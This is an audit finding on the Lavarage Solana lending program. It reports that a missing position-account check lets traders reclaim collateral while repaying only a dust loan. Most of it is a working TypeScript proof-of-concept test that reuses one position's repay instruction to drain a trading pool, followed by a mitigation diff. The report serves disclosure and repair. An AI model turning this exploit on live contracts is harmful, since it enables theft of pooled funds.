[H-01] Collateral can be claimed back without repaying its corresponding loan due to insufficient instruction validation
Submitted byArabadzhiev, also found byKoolex
Users can bypass the repayment of their loans when claiming their collateral, which can be abused in order to drain any trading pool.
Proof of Concept
Theborrow_collateralfunction located inside theswapback.rsfile lacks a crucial instruction validation check - a check for verifying that therandom_account_as_idvalue passed into therepay_solinstruction context is not the same as that passed into theborrow_collateralinstruction context. What this effectively means is that users can pass in an instruction that callsrepay_solwith aposition_accountvalue that is different than the one passed intoborrow_collateral. This can be abused in order to claim the collateral for one position, while repaying the borrowed SOL for another (even if that one was already repaid), making it possible to claim back collateral while repaying practically nothing, if the repayed position is one with a dust amount borrowed.
The following coded PoC demonstrates the issue at question. To run it, paste it at the bottom of thelavaragedescribe block in thelavarage.spec.tstest file and then runanchor testinlibs/smart-contracts. The tests insidelavarage.spec.tsare stateful, so the order in which they are executed does matter.
it('Should allow claiming collateral without repaying the loan',async()=>{constrandomAccountSeed1=Keypair.generate();constrandomAccountSeed2=Keypair.generate();consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);// increase max borrow to 1 SOL so that we don't have to mint more tokensawaitprogram.methods.lpOperatorUpdateMaxBorrow(newanchor.BN(1000000000)).accountsStrict({tradingPool,nodeWallet:nodeWallet.publicKey,operator:provider.publicKey,systemProgram:anchor.web3.SystemProgram.programId,}).rpc();awaitprogram.methods.lpOperatorFundNodeWallet(newanchor.BN(5000000000)).accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,funder:program.provider.publicKey,}).rpc();consttraderBalanceBefore=awaitprovider.connection.getBalance(provider.publicKey,);constpositionAccount=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),randomAccountSeed1.publicKey.toBuffer(),]);constpositionATA=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount,true,);// opening a first very small borrow position that we will use for callig `add_collateral` with for the secondconstborrowIx1=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(5),newanchor.BN(4)).accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:randomAccountSeed1.publicKey,// frontend fee receiver. could be any address. opening fee 0.5%feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();consttransferIx1=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA.address,provider.publicKey,100000000,9,);constaddCollateralIx1=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:randomAccountSeed1.publicKey,mint:tokenMint,toTokenAccount:positionATA.address,}).instruction();constreceiveCollateralIx1=awaitprogram.methods.tradingCloseBorrowCollateral().accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,instructions:SYSVAR_INSTRUCTIONS_PUBKEY,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:randomAccountSeed1.publicKey,mint:tokenMint,toTokenAccount:userTokenAccount.address,fromTokenAccount:positionATA.address,tokenProgram:TOKEN_PROGRAM_ID,}).instruction();constrepaySOLIx1=awaitprogram.methods.tradingCloseRepaySol(newanchor.BN(0),newanchor.BN(9997)).accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:randomAccountSeed1.publicKey,feeReceipient:anotherPerson.publicKey,}).instruction();consttx1=newTransaction().add(borrowIx1).add(transferIx1).add(addCollateralIx1).add(receiveCollateralIx1).add(repaySOLIx1);awaitprovider.sendAll([{tx:tx1}]);constpositionAccount2=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),randomAccountSeed2.publicKey.toBuffer(),]);constpositionATA2=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount2,true,);// second borrow ix that borrows an actual meaningful amount of SOLconstactualBorrowAmount=50000000;constborrowIx2=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(actualBorrowAmount+10000000),newanchor.BN(10000000),).accountsStrict({positionAccount:positionAccount2,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:randomAccountSeed2.publicKey,feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();consttransferIx2=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA2.address,provider.publicKey,10000000000,9,);constaddCollateralIx2=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount:positionAccount2,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:randomAccountSeed2.publicKey,mint:tokenMint,toTokenAccount:positionATA2.address,}).instruction();constreceiveCollateralIx2=awaitprogram.methods.tradingCloseBorrowCollateral().accountsStrict({positionAccount:positionAccount2,trader:provider.publicKey,tradingPool,instructions:SYSVAR_INSTRUCTIONS_PUBKEY,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:randomAccountSeed2.publicKey,mint:tokenMint,toTokenAccount:userTokenAccount.address,fromTokenAccount:positionATA2.address,tokenProgram:TOKEN_PROGRAM_ID,}).instruction();consttx2=newTransaction().add(borrowIx2).add(transferIx2).add(addCollateralIx2).add(receiveCollateralIx2).add(repaySOLIx1);// reuseing the first repay ix, which effectively means that we are going to repay// for the first possition a second time instead of the current one being closedawaitprovider.sendAll([{tx:tx2}]);consttraderBalanceAfter=awaitprovider.connection.getBalance(provider.publicKey,);consttraderBalanceGains=traderBalanceAfter-traderBalanceBefore;console.log('traderBalanceBefore: ',traderBalanceBefore);console.log('traderBalanceAfter: ',traderBalanceAfter);console.log('traderBalanceGains: ',traderBalanceGains);expect(traderBalanceGains).toBeGreaterThan(actualBorrowAmount*0.9);// approximate the gains due to fee deductions});
Recommended Mitigation Steps
Replace the current verification checks with a single one for theposition_accountvalue:
if ix_discriminator == crate::instruction::TradingCloseRepaySol::DISCRIMINATOR {-                   require_keys_eq!(-                       ix.accounts[2].pubkey,-                       ctx.accounts.trading_pool.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );-                   require_keys_eq!(-                       ix.accounts[1].pubkey,-                       ctx.accounts.trader.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );-                   require_keys_eq!(-                       ctx.accounts.position_account.trader.key(),-                       ctx.accounts.trader.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );-                   require_keys_eq!(-                       ctx.accounts.position_account.pool.key(),-                       ctx.accounts.trading_pool.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );+                   require_keys_eq!(+                       ix.accounts[0].pubkey,+                       ctx.accounts.position_account.key(),+                       FlashFillError::IncorrectProgramAuthority+                   );...}
Assessed type
Invalid Validation
piske-alex (Lavarage) confirmed